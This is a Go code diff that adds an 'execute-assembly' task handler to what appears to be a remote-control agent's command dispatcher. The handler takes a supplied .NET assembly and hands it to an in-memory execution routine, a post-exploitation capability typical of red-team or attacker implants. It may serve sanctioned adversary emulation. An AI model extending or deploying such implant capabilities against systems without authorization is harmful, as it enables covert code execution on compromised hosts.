@@ -51,6 +51,24 @@ func RunCommand(message string, executor string, payload []byte, agentSession *A
 				return err.Error(), ErrorExitStatus, ErrorExitStatus
 			}
 			return out, 0, 0
+		case "execute-assembly":
+			if len(task) < 2 {
+				break
+			}
+			var eaargs execasmArgs
+			argStr := strings.ReplaceAll(task[1], `\`, `\\`)
+			err := json.Unmarshal([]byte(argStr), &eaargs)
+			if err != nil {
+				return err.Error(), ErrorExitStatus, ErrorExitStatus
+			}
+			if payload == nil {
+				return "missing .NET assembly", ErrorExitStatus, ErrorExitStatus
+			}
+			out, err := execAsm(agentSession.Session, agentSession.RPC, payload, eaargs)
+			if err != nil {
+				return err.Error(), ErrorExitStatus, ErrorExitStatus
+			}
+			return out, 0, 0
 		case "exit":
 			return shutdown(agentSession)
 		default:
